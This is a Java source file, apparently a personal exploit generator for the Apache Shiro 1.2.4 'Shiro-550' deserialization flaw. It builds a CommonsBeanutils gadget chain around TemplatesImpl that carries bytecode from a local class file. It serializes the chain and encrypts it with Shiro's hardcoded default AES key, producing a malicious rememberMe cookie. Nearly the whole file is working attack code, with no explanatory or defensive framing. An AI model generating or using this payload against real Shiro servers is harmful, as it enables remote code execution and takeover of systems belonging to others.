import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/4/14
 * Description 无依赖，shiro1.2.4
 */
public class shiro550Test2 {
    final static String path = "ser.bin";
    private static final String KEY = "kPH+bIxk5D2deZiIxcaaaA==";

    public static void main(String[] args) throws Exception{
        // 无依赖的情况下，首先使用的就是CB链，因为shiro默认是自带commons-beanutils1.8.3
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes()};
        bytecodes.set(templates,b);

        BeanComparator comparator = new BeanComparator("outputProperties",new AttrCompare());
        PriorityQueue<Object> queue = new PriorityQueue<>(2,comparator);

        Field queues = queue.getClass().getDeclaredField("queue");
        queues.setAccessible(true);
        Object[] queueArray = (Object[])queues.get(queue);
        queueArray[0] = templates;
        queueArray[1] = null;

        Field size = queue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue,2);

        serialize(queue);
//        deserialize();

        String enc = enc(getFile());
        System.out.print(enc);
    }

    public static String enc(byte[] data){
        CipherService cipherService = new AesCipherService();
        byte[] key = Base64.decode(KEY);
        ByteSource encrypt = cipherService.encrypt(data, key);
        byte[] bytes = encrypt.getBytes();
        String s = Base64.encodeToString(bytes);
        return s;
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }

    public static byte[] classBytes() throws IOException {
        // 注意路径
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }

    // 获取 ser.bin 也就是生成的序列化字符串的东西
    public static byte[] getFile() throws Exception{
        FileInputStream fis = new FileInputStream("ser.bin");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
